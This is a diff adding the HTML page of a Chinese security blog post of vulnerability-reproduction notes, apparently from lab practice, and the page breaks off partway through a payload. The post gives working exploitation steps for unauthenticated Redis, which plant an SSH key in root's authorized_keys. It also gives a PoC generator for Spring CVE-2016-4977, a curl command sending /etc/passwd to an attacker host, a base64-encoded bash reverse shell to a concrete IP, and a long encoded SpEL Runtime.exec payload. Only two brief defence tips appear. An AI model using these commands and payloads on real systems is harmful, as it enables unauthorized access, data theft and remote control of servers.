@@ -1,0 +1,947 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="漏洞复现CVE-2012-2122Mysql身份认证漏洞进入MySQL靶场 redis未授权 首先使用ssh-keygen -t rsa 来生成一个密钥 #生成密钥 cd &#x2F;root&#x2F;.ssh (echo -e”\n”;cat id_rsa.pub;echo -e “\n”)&gt;key.txt #密钥输出 cat key.txt|redis-cli -h ip地址 -p 端">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞复现">
+<meta property="og:url" content="http://example.com/2022/02/21/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="漏洞复现CVE-2012-2122Mysql身份认证漏洞进入MySQL靶场 redis未授权 首先使用ssh-keygen -t rsa 来生成一个密钥 #生成密钥 cd &#x2F;root&#x2F;.ssh (echo -e”\n”;cat id_rsa.pub;echo -e “\n”)&gt;key.txt #密钥输出 cat key.txt|redis-cli -h ip地址 -p 端">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/.com//....%5Cpublic%5Cimg%5CSpEL-1.png">
+<meta property="og:image" content="http://example.com/.com//....%5Cpublic%5Cimg%5Cspringboot-1">
+<meta property="og:image" content="http://example.com/.com//....%5Cpublic%5Cimg%5Cspring-web-flow-2.png">
+<meta property="og:image" content="http://example.com/.com//....%5Cpublic%5Cimg%5Cspring-web-flow-3.png">
+<meta property="og:image" content="http://example.com/.com//....%5Cpublic%5Cimg%5Cspring-web-flow-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/log4j-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311642619.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/log4j-3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/log4j_4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311644720.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311649735.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311653024.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311653792.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311653050.jpeg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311654590.jpeg">
+<meta property="article:published_time" content="2022-02-21T02:24:08.000Z">
+<meta property="article:modified_time" content="2023-07-31T09:03:25.102Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/.com//....%5Cpublic%5Cimg%5CSpEL-1.png">
+  
+  
+  
+  <title>漏洞复现 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"↙","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":"UA-233159895-1","gtag":"G-XKM51WKGR7","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"mPhovhHHyKg2LpAcQhS6tjAw-gzGzoHsz","app_key":"6W2dsSWjVfMOOkXrNbFWOSDN","server_url":"https://mphovhhh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.google-analytics.com/analytics.js', function() {
+          window.ga = window.ga || function() { (ga.q = ga.q || []).push(arguments) };
+          ga.l = +new Date;
+          ga('create', 'UA-233159895-1', 'auto');
+          ga('send', 'pageview');
+        });
+      }
+    </script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.googletagmanager.com/gtag/js?id=G-XKM51WKGR7', function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-XKM51WKGR7');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="漏洞复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-02-21 10:24" pubdate>
+          2022年2月21日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          123 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">漏洞复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h3 id="CVE-2012-2122Mysql身份认证漏洞"><a href="#CVE-2012-2122Mysql身份认证漏洞" class="headerlink" title="CVE-2012-2122Mysql身份认证漏洞"></a>CVE-2012-2122Mysql身份认证漏洞</h3><p>进入MySQL靶场</p>
+<h3 id="redis未授权"><a href="#redis未授权" class="headerlink" title="redis未授权"></a>redis未授权</h3><blockquote>
+<p>首先使用ssh-keygen -t rsa 来生成一个密钥 #生成密钥</p>
+<p>cd &#x2F;root&#x2F;.ssh</p>
+<p>(echo -e”\n”;cat id_rsa.pub;echo -e “\n”)&gt;key.txt #密钥输出</p>
+<p>cat key.txt|redis-cli -h ip地址 -p 端口 -x set crack #写入密钥</p>
+<p>redis-cli -h ip地址 -p 端口 #匿名连接</p>
+<p>config set dir &#x2F;root&#x2F;.ssh #设置redis备份文件的目录</p>
+<p>config set dbfilename authorized_keys #设置文件名</p>
+<p>save #保存文件</p>
+<p>exit</p>
+<p>ssh -i id_rsa root@ip地址 #使用ssh连接</p>
+</blockquote>
+<p>防御方法</p>
+<p>1.将redis.conf的bind设置为127.0.0.1</p>
+<p>2.在redis.conf文件找到requirepass设置登录的认证</p>
+<h3 id="Spring-SpEL表达式漏洞"><a href="#Spring-SpEL表达式漏洞" class="headerlink" title="Spring SpEL表达式漏洞"></a>Spring SpEL表达式漏洞</h3><blockquote>
+<p>这个接口是用来解析SpEL表达式,如果为做好屏蔽则会产生漏洞(他的实现类也要注意)</p>
+<p>org.springframework.expression.ExpressionParser     &#x2F;&#x2F;<strong>表示解析器</strong></p>
+<p>org.springframework.expression.spel.standard.SpelExpression &#x2F;&#x2F;表达式对象  (&#x3D;&#x3D;getValue()方法用来进行计算时会调用代码&#x3D;&#x3D;)</p>
+<p>其中表达式关于类的引入</p>
+<p><img src="/.com//....%5Cpublic%5Cimg%5CSpEL-1.png" srcset="/img/loading.gif" lazyload alt="image-20220305190602756"></p>
+</blockquote>
+<p>​	</p>
+<h4 id="SimpleEvaluationContext和StandardEvaluationContext"><a href="#SimpleEvaluationContext和StandardEvaluationContext" class="headerlink" title="SimpleEvaluationContext和StandardEvaluationContext"></a><strong>SimpleEvaluationContext和StandardEvaluationContext</strong></h4><p>SimpleEvaluationContext: 不包含类相关的危险操作，比较安全</p>
+<p>StandardEvaluationContext: 包含所有功能，存在风险（默认加载）</p>
+<p>关于SpEL表达式</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e0b50053b5d3">https://www.jianshu.com/p/e0b50053b5d3</a></p>
+<p>用法一共有三种</p>
+<p>1.@Value中使用如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;表达式&#125;&quot;)</span><br></code></pre></td></tr></table></figure>
+
+<p>2.XML配置</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.java.XXXXX.xx&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 同@Value,#&#123;&#125;内是表达式的值，可放在property或constructor-arg内 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;arg&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;表达式&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>3.在代码中执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//创建ExpressionParser解析表达式</span><br>    <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-comment">//表达式放置</span><br>    <span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;表达式&quot;</span>);<br>    <span class="hljs-comment">//执行表达式，默认容器是spring本身的容器：ApplicationContext</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> exp.getValue();<br>    <span class="hljs-comment">/**如果使用其他的容器，则用下面的方法*/</span><br>    <span class="hljs-comment">//创建一个虚拟的容器EvaluationContext，注册一个函数</span><br>    <span class="hljs-type">StandardEvaluationContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>    <span class="hljs-comment">//向容器内添加bean</span><br>    <span class="hljs-type">BeanA</span> <span class="hljs-variable">beanA</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanA</span>();<br>    ctx.setVariable(<span class="hljs-string">&quot;bean_id&quot;</span>, beanA);<br>    <span class="hljs-comment">//setRootObject并非必须；一个EvaluationContext只能有一个RootObject，引用它的属性时，可以不加前缀</span><br>    ctx.setRootObject(XXX);<br>    <span class="hljs-comment">//getValue有参数ctx，从新的容器中根据SpEL表达式获取所需的值</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> exp.getValue(ctx);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>还可以调用对象(需要@Bean)变量,函数,正则,运算符,Elvis</p>
+<blockquote>
+<p><strong>root和this</strong></p>
+<p>SpEL中#root总是指的刚开始的表达式对象，而#this总是指的当前的表达式对象，用他们可以直接操作当前上下文。</p>
+</blockquote>
+<h4 id="框架特征检测"><a href="#框架特征检测" class="headerlink" title="框架特征检测:"></a><strong>框架特征检测:</strong></h4><p>1.spring框架的默认图标为favicon.ico图标</p>
+<p>2.springboot 4xx,5xx的默认报错页面</p>
+<p><img src="/.com//....%5Cpublic%5Cimg%5Cspringboot-1" srcset="/img/loading.gif" lazyload alt="image-20210529225327692.png"></p>
+<p>3.Wappalyzer 插件识别</p>
+<p>4.X-Application-Context</p>
+<h4 id="首先CVE-2016-4977"><a href="#首先CVE-2016-4977" class="headerlink" title="首先CVE-2016-4977"></a><strong>首先CVE-2016-4977</strong></h4><p>vulhub提供了poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter message to encode:&#x27;</span>)<br><br>poc = <span class="hljs-string">&#x27;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#x27;</span> % <span class="hljs-built_in">ord</span>(message[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> message[<span class="hljs-number">1</span>:]:<br>   poc += <span class="hljs-string">&#x27;.concat(T(java.lang.Character).toString(%s))&#x27;</span> % <span class="hljs-built_in">ord</span>(ch)<br>poc += <span class="hljs-string">&#x27;)&#125;&#x27;</span><br><br><span class="hljs-built_in">print</span>(poc)<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>curl 攻击端ip:攻击端端口 -d “$(cat &#x2F;etc&#x2F;passwd)” </p>
+<p>使用curl 来测试返回在是否能发送数据，-d代表发送数据 </p>
+<p>使用nc 监听端口即可收到消息</p>
+<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMjQuNC4yNi84ODg4IDA+JjE&#x3D;}|{base64,-d}|{bash,-i} </p>
+<p>反弹shell并用poc生成字节码</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;$&#123;<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Runtime)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">98</span>)<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">115</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">104</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">32</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">45</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">99</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">32</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">123</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">101</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">99</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">104</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">111</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">44</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">89</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">109</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">70</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">122</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">67</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">65</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">116</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">97</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">83</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">65</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">43</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">74</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">105</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">65</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">118</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">90</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">71</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">86</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">50</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">76</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">51</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">82</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">106</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">99</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">67</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">56</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">120</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">78</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">122</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">85</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">117</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">77</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">106</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">81</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">117</span>))<span class="hljs-selector-class">.concat</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Character)<span class="hljs-selector-class">.toString</span>(<span class="hljs-number">78</span>))<span 